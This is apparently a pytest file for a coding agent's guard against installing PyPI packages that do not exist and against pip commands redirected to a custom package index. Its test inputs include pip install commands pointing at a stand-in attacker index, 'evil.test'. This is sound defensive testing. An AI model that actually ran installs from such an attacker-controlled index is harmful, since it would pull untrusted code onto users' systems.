"""GAP-7 — pip-install slopsquatting integrity check.

verify_pip_install blocks a `pip install` of a package that does not exist on
PyPI (a hallucinated name → 404), allows real packages, ignores non-pip
commands, and fails OPEN on a network error so offline dev is never blocked.

Run:
    python -m pytest tests/test_pip_integrity.py -q
"""

from __future__ import annotations

import sys
import urllib.error
import urllib.request
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent))

from core.goal_session import verify_pip_install, _extract_pip_packages


def test_extract_packages():
    assert _extract_pip_packages("pip install requests") == ["requests"]
    assert _extract_pip_packages("pip install requests==2.0 flask") == ["requests", "flask"]
    assert _extract_pip_packages("python -m pip install numpy") == ["numpy"]
    assert _extract_pip_packages("pip install -r requirements.txt") == []
    assert _extract_pip_packages("pip install ./localpkg") == []
    assert _extract_pip_packages("pip list") == []
    assert _extract_pip_packages("pytest -q") == []


class _OK:
    status = 200

    def read(self):
        return b"{}"

    def __enter__(self):
        return self

    def __exit__(self, *exc):
        return False


def test_real_package_allowed(monkeypatch):
    monkeypatch.setattr(urllib.request, "urlopen", lambda req, timeout=None: _OK())
    ok, reason = verify_pip_install("pip install requests")
    assert ok and reason == ""


def test_hallucinated_package_blocked(monkeypatch):
    def boom(req, timeout=None):
        raise urllib.error.HTTPError(req.full_url, 404, "Not Found", {}, None)

    monkeypatch.setattr(urllib.request, "urlopen", boom)
    ok, reason = verify_pip_install("pip install reqests-totally-made-up-xyz")
    assert not ok and "not found on pypi" in reason.lower()


def test_network_error_fails_open(monkeypatch):
    def boom(req, timeout=None):
        raise TimeoutError("offline")

    monkeypatch.setattr(urllib.request, "urlopen", boom)
    ok, _ = verify_pip_install("pip install requests")
    assert ok  # fail OPEN — don't block offline dev


def test_non_pip_command_passes():
    ok, reason = verify_pip_install("pytest -q && ruff check")
    assert ok and reason == ""


def test_custom_index_url_is_blocked(monkeypatch):
    # A redirected index defeats the PyPI existence check — must be denied even
    # though "requests" exists on PyPI. urlopen must not even be reached.
    def no_net(*a, **k):
        raise AssertionError("urlopen should not be called for a redirected index")

    monkeypatch.setattr(urllib.request, "urlopen", no_net)
    for cmd in (
        "pip install --index-url http://evil.test/simple requests",
        "pip install -i http://evil.test/simple requests",
        "pip install --extra-index-url=http://evil.test/s requests",
    ):
        ok, reason = verify_pip_install(cmd)
        assert not ok and "index" in reason.lower(), cmd


def test_official_index_url_not_treated_as_override(monkeypatch):
    monkeypatch.setattr(urllib.request, "urlopen", lambda req, timeout=None: _OK())
    ok, _ = verify_pip_install("pip install --index-url https://pypi.org/simple requests")
    assert ok


def test_one_404_among_real_packages_blocks(monkeypatch):
    def fake(req, timeout=None):
        if "realpkg" in req.full_url:
            return _OK()
        raise urllib.error.HTTPError(req.full_url, 404, "Not Found", {}, None)

    monkeypatch.setattr(urllib.request, "urlopen", fake)
    ok, reason = verify_pip_install("pip install realpkg fakepkg-xyz")
    assert not ok and "fakepkg-xyz" in reason


async def test_command_executor_run_terminal_blocks_bad_pip(monkeypatch):
    # The OTHER RUN_TERMINAL path (command_executor) must also enforce the gate,
    # not just DevAgent._run_terminal.
    import core.goal_session as gs
    from core.command_executor import CommandExecutor, Command

    monkeypatch.setattr(gs, "verify_pip_install",
                        lambda command: (False, "Package 'fakepkg' not found on PyPI"))

    called = {"sandbox": False}

    def _should_not_run(*a, **k):  # pragma: no cover - must not be reached
        called["sandbox"] = True
        raise AssertionError("run_sandboxed must not run when pip verify fails")

    import inference.sandbox as sb
    monkeypatch.setattr(sb, "run_sandboxed", _should_not_run)

    ex = CommandExecutor()
    cmd = Command(text="pip install fakepkg", action="RUN_TERMINAL", source="dev",
                  params={"command": "pip install fakepkg"})
    out = await ex.execute(cmd)
    # execute() wraps the handler dict under "result" (same as the M2 cwd-denied
    # path). The security property is that the command is denied and the sandbox
    # never runs.
    inner = out.get("result", out)
    assert inner.get("status") == "error"
    assert "not found on pypi" in inner.get("error", "").lower()
    assert called["sandbox"] is False
